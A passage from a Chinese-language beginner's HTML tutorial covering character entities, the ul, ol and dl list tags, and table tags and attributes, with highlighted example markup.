tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>　　  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="2-4-HTML字符实体"><font color="#3CB371" face="Comic sans MS">2.4 HTML字符实体</font><a href="post/HTML-basics#2-4-HTML字符实体"></a></h4><br><p><font face="Microsoft YaHei"><strong>HTML 中的</strong><font color="#FF7F00"><strong>预留字符</strong></font><strong>必须被替换为</strong><font color="#FF7F00"><strong>字符实体</strong></font>。</font></p><br><p><font face="Microsoft YaHei"><strong>1. HTML 实体</strong></font></p><ol><li><p>在 HTML 中，某些字符是预留的。</p></li><li><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</p></li><li><p>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</p></li><li><p><strong>注：</strong><font color="#FF7F00"><strong>记得加上半角分号<code>;</code>符号啊，不然识别不出来</strong></font></p></li></ol><br><blockquote><p>如需显示小于号，我们必须这样写：<code>&amp;lt;</code> 或 <code>&amp;#60;</code><br><strong>提示：</strong>使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p></blockquote><br><p><font face="Microsoft YaHei"><strong>2. 不间断空格（non-breaking space）</strong></font></p><ul><li><p>HTML 中的常用字符实体是不间断空格(<code>&amp;nbsp;</code>)。</p></li><li><p>浏览器总是会截短 HTML 页面中的空格。<font color="#FF7F00"><strong>如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个</strong></font>，因此，要使用10个空格的话就需要写10个<code>&amp;nbsp;</code> 。（如需在页面中增加空格的数量，您需要使用 <code>&amp;nbsp;</code> 字符实体）</p></li></ul><br><p><font face="Microsoft YaHei"><strong>3. HTML 中有用的字符实体</strong></font></p><p><strong>注释：</strong>实体名称对大小写敏感！半角分号不要忘记！<br>如果想要输出<code>&amp;nbsp;</code>而不被转义为空格，可这样：<code>&amp;amp;nbsp;</code>，因为<code>&amp;amp;</code>对应<code>$</code>--&gt;&amp;nbsp;</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">显示结果</th><th align="left">描述</th><th align="left">实体名称</th><th align="left">实体编号</th></tr></thead><tbody><tr><td align="left"></td><td align="left">空格</td><td align="left"><strong><code>&amp;nbsp;</code></strong></td><td align="left"><strong><code>&amp;#160;</code></strong></td></tr><tr><td align="left">&lt;</td><td align="left">小于号</td><td align="left"><strong><code>&amp;lt;</code></strong></td><td align="left"><strong><code>&amp;#60;</code></strong></td></tr><tr><td align="left">&gt;</td><td align="left">大于号</td><td align="left"><strong><code>&amp;gt;</code></strong></td><td align="left"><strong><code>&amp;#62;</code></strong></td></tr><tr><td align="left">&amp;</td><td align="left">和号</td><td align="left"><strong><code>&amp;amp;</code></strong></td><td align="left"><strong><code>&amp;#38;</code></strong></td></tr><tr><td align="left">“</td><td align="left">引号</td><td align="left"><strong><code>&amp;quot;</code></strong></td><td align="left"><strong><code>&amp;#34;</code></strong></td></tr><tr><td align="left">‘</td><td align="left">撇号</td><td align="left"><strong><code>&amp;apos;</code></strong>(IE不支持)</td><td align="left"><strong><code>&amp;#39;</code></strong></td></tr><tr><td align="left">￠</td><td align="left">分（cent）</td><td align="left"><strong><code>&amp;cent;</code></strong></td><td align="left"><strong><code>&amp;#162;</code></strong></td></tr><tr><td align="left">£</td><td align="left">镑（pound）</td><td align="left"><strong><code>&amp;pound;</code></strong></td><td align="left"><strong><code>&amp;#163;</code></strong></td></tr><tr><td align="left">¥</td><td align="left">元（yen）</td><td align="left"><strong><code>&amp;yen;</code></strong></td><td align="left"><strong><code>&amp;#165;</code></strong></td></tr><tr><td align="left">€</td><td align="left">欧元（euro）</td><td align="left"><strong><code>&amp;euro;</code></strong></td><td align="left"><strong><code>&amp;#8364;</code></strong></td></tr><tr><td align="left">§</td><td align="left">小节</td><td align="left"><strong><code>&amp;sect;</code></strong></td><td align="left"><strong><code>&amp;#167;</code></strong></td></tr><tr><td align="left">©</td><td align="left">版权（copyright）</td><td align="left"><strong><code>&amp;copy;</code></strong></td><td align="left"><strong><code>&amp;#169;</code></strong></td></tr><tr><td align="left">®</td><td align="left">注册商标</td><td align="left"><strong><code>&amp;reg;</code></strong></td><td align="left"><strong><code>&amp;#174;</code></strong></td></tr><tr><td align="left">™</td><td align="left">商标</td><td align="left"><strong><code>&amp;trade;</code></strong></td><td align="left"><strong><code>&amp;#8482;</code></strong></td></tr><tr><td align="left">×</td><td align="left">乘号</td><td align="left"><strong><code>&amp;times;</code></strong></td><td align="left"><strong><code>&amp;#215;</code></strong></td></tr><tr><td align="left">÷</td><td align="left">除号</td><td align="left"><strong><code>&amp;divide;</code></strong></td><td align="left"><strong><code>&amp;#247;</code></strong></td></tr></tbody></table></div></div><p>完整的实体符号参考：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">HTML ISO-8859-1 参考手册</a>]</font> </p><br><br><h3 id="三-HTML-列表"><font color="#FF6347" face="Comic sans MS">三. HTML 列表</font><a href="post/HTML-basics#三-HTML-列表"></a></h3><p>列表就是像word里面的标题一样，顺着往下数的标题。</p><p>HTML 支持<font color="#FF7F00"><strong>无序列表ul</strong></font>(unordered list）、<font color="#FF7F00"><strong>有序列表ol</strong></font>（ordered list）和<font color="#FF7F00"><strong>自定义列表dl</strong></font>（definition list）</p><br><ul><li><input checked disabled type="checkbox"> <strong><code>&lt;ul&gt;&lt;/ul&gt;</code></strong> 无序列表<ul><li><input checked disabled type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li><li><input checked disabled type="checkbox"> <strong><code>type</code></strong> 列表项属性，放在&lt;ul type=””&gt;里，取值有：<ul><li><input disabled type="checkbox"> <strong><code>disc</code></strong> 小黑点</li><li><input disabled type="checkbox"> <strong><code>circle</code></strong> 空心圆</li><li><input disabled type="checkbox"> <strong><code>square</code></strong> 实心方块</li></ul></li></ul></li><li><input checked disabled type="checkbox"> <strong><code>&lt;ol&gt;&lt;/ol&gt;</code></strong> 有序列表<ul><li><input checked disabled type="checkbox"> <strong><code>&lt;li&gt;&lt;/li&gt;</code></strong> 列表项</li><li><input checked disabled type="checkbox"> <strong><code>type</code></strong> 编号类型，放在&lt;ol type=””&gt;里，取值有：<ul><li><input disabled type="checkbox"> <strong><code>1</code></strong> 整数有序列表</li><li><input disabled type="checkbox"> <strong><code>a</code></strong> 字母小写有序列表</li><li><input disabled type="checkbox"> <strong><code>A</code></strong> 字母大写有序列表</li><li><input disabled type="checkbox"> <strong><code>i</code></strong> 罗马小写有序列表</li><li><input disabled type="checkbox"> <strong><code>I</code></strong> 罗马大写有序列表</li></ul></li><li><input checked disabled type="checkbox"> <strong><code>start</code></strong> 从第几个开始编号(数字)，放在&lt;dl type=”” start=””&gt;里。</li></ul></li><li><input checked disabled type="checkbox"> <strong><code>&lt;dl&gt;&lt;/dl&gt;</code></strong> 自定义列表<ul><li><input disabled type="checkbox"> <strong><code>&lt;dt&gt;&lt;/dt&gt;</code></strong> 自定义列表项<ul><li><input disabled type="checkbox"> <strong><code>&lt;dd&gt;&lt;/dd&gt;</code></strong> 自定义列表项的描述</li></ul></li></ul></li></ul><br><p>列表展示如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2019/03/09/5c8320e82a362.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">start</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--有序列表开始--></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>哈哈，这里是第一条有序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--无序列表开始--></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>这里是第一条无序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>这里是第二条无序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>                         <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--无序列表结束--></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>disc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>这里是第三条无序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>这里是第四条无序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>哈哈，这里是第二条有序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>square<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>这里是第五条无序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>这里是第六条无序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span></span>                             <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--有序列表结束--></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span> <span class="token attr-name">start</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>哈哈，这里是第三条有序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>哈哈，这里是第四条有序列表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span></span>我是第一个自定义列表的列表项<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span></span>我是第一个自定义列表的列表项的描述<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/09/5c832ded3bac1.png" alt="7.png" data-zoomable></p></div><p>可参读博文：<font color="#00B2EE">《<a href="https://www.cnblogs.com/yyhh/p/4208951.html" target="_blank" rel="noopener">HTML表格与列表</a>》</font> </p><br><br><h3 id="四-HTML-表格"><font color="#FF6347" face="Comic sans MS">四. HTML 表格</font><a href="post/HTML-basics#四-HTML-表格"></a></h3><p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、表格</strong></font></p><p>网页中有类似word里面的功能，当然，也会有类似excel里面的功能，表格就是其中之一。</p><p>表格由 <code>&lt;table&gt;</code> 标签来定义。每个表格均有若干行（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干单元格（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p><br><p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格的结构</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>                         <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--定义表格--></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--定义一行--></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--定义一个标题单元格--></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token markup">&lt;/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--定义一个单元格--></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格标签及属性</strong></font></p><p><strong>注：</strong>属性是区分大小写的，bgColor如果写成bgcolor是没有效果的</p><ul><li><input checked disabled type="checkbox"> <strong><code>&lt;table&gt;&lt;/table&gt;</code></strong> 表，----&gt;可选属性： ↓↓<ul><li><input disabled type="checkbox"> <strong><code>Width</code></strong>：表格宽度，单位可以是百分比，也可以是固定值。取值： ↓↓<ul><li><input disabled type="checkbox"> pixels</li><li><input disabled type="checkbox"> %</li></ul></li><li><input disabled type="checkbox"> <strong><code>Height</code></strong>：表格高度。取值： ↓↓<ul><li><input disabled type="checkbox"> pixels</li><li><input disabled type="checkbox"> %</li></ul></li><li><input disabled type="checkbox"> <strong><code>Align</code></strong>：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul><li><input disabled type="checkbox"> left</li><li><input disabled type="checkbox"> center</li><li><input disabled type="checkbox"> right</li></ul></li><li><input disabled type="checkbox"> <strong><code>Border</code></strong>：边框粗细。取值： ↓↓<ul><li><input disabled type="checkbox"> pixels</li></ul></li><li><input disabled type="checkbox"> <strong><code>Bordercolor</code></strong>：边框颜色。取值：rgb(x,x,x)、#xxxxxx、colorname</li><li><input disabled type="checkbox"> <strong><code>bgColor</code></strong>：表格背景色（<font color="#FF7F00">不赞成使用该属性</font>）。取值： rgb(x,x,x)、#xxxxxx、colorname</li><li><input disabled type="checkbox"> <strong><code>background</code></strong>：背景图片，取值：URL</li><li><input disabled type="checkbox"> <strong><code>cellpadding</code></strong>：单元格边线到内容间的距离(填充距离)。取值： ↓↓<ul><li><input disabled type="checkbox"> pixels</li><li><input disabled type="checkbox"> %</li></ul></li><li><input disabled type="checkbox"> <strong><code>cellspacing</code></strong>：单元格与单元格之间的距离(间距)，默认是双线<strong>，这个很重要</strong><br>取值： ↓↓<ul><li><input disabled type="checkbox"> pixels</li><li><input disabled type="checkbox"> %</li></ul></li><li><input disabled type="checkbox"> <strong><code>rules</code></strong>：合并单元格边框线，取值：all。<strong>注意：</strong>rules兼容性不好，请使用CSS来取代它。</li><li><input disabled type="checkbox"> <strong><code>summary</code></strong>：摘要，使搜索引擎更好的读懂表格内容，更好的帮助特殊用户读取表格内容。取值： ↓↓<ul><li><input disabled type="checkbox"> text</li></ul></li></ul></li><li><input checked disabled type="checkbox"> <strong><code>&lt;caption&gt;&lt;/caption&gt;</code></strong>：定义表格标题。可选属性： ↓↓<ul><li><input disabled type="checkbox"> <strong><code>Align</code></strong>：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul><li><input disabled type="checkbox"> left</li><li><input disabled type="checkbox"> top</li><li><input disabled type="checkbox"> rightbottom</li><li><input disabled type="checkbox"> bottom</li></ul></li></ul></li><li><input checked disabled type="checkbox"> <strong><code>&lt;tr&gt;&lt;/tr&gt;</code></strong>：行标记。可选属性： ↓↓<ul><li><input disabled type="checkbox"> <strong><code>bgColor</code></strong>：行的背景色。取值： rgb(x,x,x)、#xxxxxx、colorname</li><li><input disabled type="checkbox"> <strong><code>Height</code></strong>：行高度。取值： ↓↓<ul><li><input disabled type="checkbox"> pixels</li><li><input disabled type="checkbox"> %</li></ul></li><li><input disabled type="checkbox"> <strong><code>Align</code></strong>：表格内容对齐方式。取值： ↓↓<ul><li><input disabled type="checkbox"> left</li><li><input disabled type="checkbox"> center</li><li><input disabled type="checkbox"> right</li><li><input disabled type="checkbox"> justify</li><li><input disabled type="checkbox"> char</li></ul></li><li><input disabled type="checkbox"> <strong><code>valign</code></strong>：属性趋向于垂直对齐，其值包含：top、bottom、middle、baseline</li></ul></li><li><input checked disabled type="checkbox"> <strong><code>&lt;th&gt;&lt;/th&gt;</code></strong>：标题单元格（每列第一行），居中加粗显示。</li><li><input checked disabled type="checkbox"> <strong><code>&lt;td&gt;&lt;/td&gt;</code></strong>：普通单元格。<code>&lt;th&gt;</code>和<code>&lt;td&gt;</code>可选属性： ↓↓<ul><li><input disabled type="checkbox"> <strong><code>height</code></strong>：单元格高度</li><li><input disabled type="checkbox"> <strong><code>width</code></strong>：单元格宽度</li><li><input disabled type="checkbox"> <strong><code>bgColor</code></strong>：单元格背景色</li><li><input disabled type="checkbox"> <strong><code>background</code></strong>：单元格背景图片</li><li><input disabled type="checkbox"> <strong><code>align</code></strong>：水平对齐</li><li><input disabled type="checkbox"> <strong><code>valign</code></strong>：垂直水齐</li><li><input disabled type="checkbox"> <strong><code>rowspan</code></strong>：<font color="#FF7F00"><strong>上下单元格合并。合并属性必须放在第一个单元格中。</strong></font></li><li><input disabled type="checkbox"> <strong><code>colspan</code></strong>：<font color="#FF7F00"><strong>左右单元格合并。合并时，有增就得有减，要保证每一行单元格的个数不变。</strong></font></li></ul></li></ul><br><br><p><font color="#00B2EE" face="Microsoft YaHei"><strong>三、表格标签示例</strong></font></p><ol><li><code>&lt;table&gt;、&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;</code>示例：</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>     <span class="token operator">&lt;</span>table border<span class="token operator">=</span><span class="token string">"2"</span> width<span class="token operator">=</span><span class="token string">"300"</span> height<span class="token operator">=</span><span class="token string">"100"</span> bordercolor<span class="token operator">=</span><span class="token string">"blue"</span> bgColor<span class="token operator">=</span><span class="token string">"#88cc66"</span>             cellspacing<span class="token operator">=</span><span class="token string">"0"</span> cellpadding<span class="token operator">=</span><span class="token string">"2"</span> rules<span class="token operator">=</span><span class="token string">"all"</span><span class="token operator">></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>工号<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>姓名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>职位<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">001</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>小明<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>设计师<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">002</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>小方<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>工程师<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span 